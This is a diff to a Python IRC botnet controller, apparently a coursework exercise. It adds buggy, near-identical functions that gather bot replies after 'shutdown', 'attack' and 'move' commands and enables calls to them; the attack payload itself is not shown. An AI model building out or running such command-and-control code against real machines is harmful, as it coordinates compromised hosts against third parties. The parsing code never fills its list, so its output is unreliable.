@@ -106,7 +106,109 @@ def recieve_status_data(sock: socket, channel: str):
     for bot in find_bot:
         print(bot)
 
+# Receive shutdown data from all bots, parsed so every bot's output is received
+def recieve_shutdown_data(sock: socket):
+    i = 0
+    j = 0
+    bot_status = list()
+    parse_irc_data = []
+    find_bot = list()    
+    while i < 5:
+        read_data = [sock]
+        write_data = []
+        error_data = []
+        readList, writeList, errorList = select.select(read_data, write_data, error_data, 0.1)
+        if readList:
 
+            # There is a bug when the data is recieved at the same time ..... -----------------
+            response = sock.recv(1024).decode()
+            bot_status.append(response)
+            j = j + 1       #counts number of bots which sent data back
+
+        else:
+            # Waits for 5 seconds
+            i = i + 1
+            
+    for i in find_bot:
+        if(i == ""):
+            find_bot.remove("")
+        elif(i == "\r\n"):
+
+            find_bot.remove(i)
+            
+    print("Result: ", len(find_bot), " bots shutdown.")
+    status_string = ""
+    for bot in find_bot:
+        print(bot)
+
+def recieve_attack_data(sock: socket):
+    i = 0
+    j = 0
+    bot_attack = list()
+    parse_irc_data = []
+    find_bot = list()    
+    while i < 5:
+        read_data = [sock]
+        write_data = []
+        error_data = []
+        readList, writeList, errorList = select.select(read_data, write_data, error_data, 0.1)
+        if readList:
+
+            # There is a bug when the data is recieved at the same time ..... -----------------
+            response = sock.recv(1024).decode()
+            bot_attack.append(response)
+            j = j + 1       #counts number of bots which sent data back
+
+        else:
+            # Waits for 5 seconds
+            i = i + 1
+            
+    for i in find_bot:
+        if(i == ""):
+            find_bot.remove("")
+        elif(i == "\r\n"):
+
+            find_bot.remove(i)
+            
+    print("Result: ", len(find_bot), " bots discovered.")
+    status_string = ""
+    for bot in find_bot:
+        print(bot)
+
+def recieve_move_data(sock: socket):
+    i = 0
+    j = 0
+    bot_move = list()
+    parse_irc_data = []
+    find_bot = list()    
+    while i < 5:
+        read_data = [sock]
+        write_data = []
+        error_data = []
+        readList, writeList, errorList = select.select(read_data, write_data, error_data, 0.1)
+        if readList:
+
+            # There is a bug when the data is recieved at the same time ..... -----------------
+            response = sock.recv(1024).decode()
+            bot_move.append(response)
+            j = j + 1       #counts number of bots which sent data back
+
+        else:
+            # Waits for 5 seconds
+            i = i + 1
+            
+    for i in find_bot:
+        if(i == ""):
+            find_bot.remove("")
+        elif(i == "\r\n"):
+
+            find_bot.remove(i)
+            
+    print("Result: ", len(find_bot), " bots discovered.")
+    status_string = ""
+    for bot in find_bot:
+        print(bot)
+        
 def bot_controller(args: str, sock: socket):
 
     split_hostPort = args.hostname_port.split(":")
@@ -156,7 +258,7 @@ def bot_controller(args: str, sock: socket):
             #print("send command: ", nonce_mac_cmd)
             sock.send(nonce_mac_cmd.encode())
             recieve_status_data(sock, channel)
-            #recieve_shutdown_data(sock)
+            recieve_shutdown_data(sock)
 
         elif command[0:6] == "attack":
             print("attack command")
@@ -170,7 +272,7 @@ def bot_controller(args: str, sock: socket):
             sock.send(nonce_mac_cmd.encode())
 
             recieve_status_data(sock, channel)
-            #recieve_attack_data(sock)
+            recieve_attack_data(sock)
 
         elif command[0:4] == "move":
             print("move command")
@@ -184,7 +286,8 @@ def bot_controller(args: str, sock: socket):
             sock.send(nonce_mac_cmd.encode())
 
             recieve_status_data(sock, channel)
-            #recieve_attack_data(sock)
+            recieve_move_data(sock)
+            
         elif command == "quit":
             print("Bye.")
             exit(1)
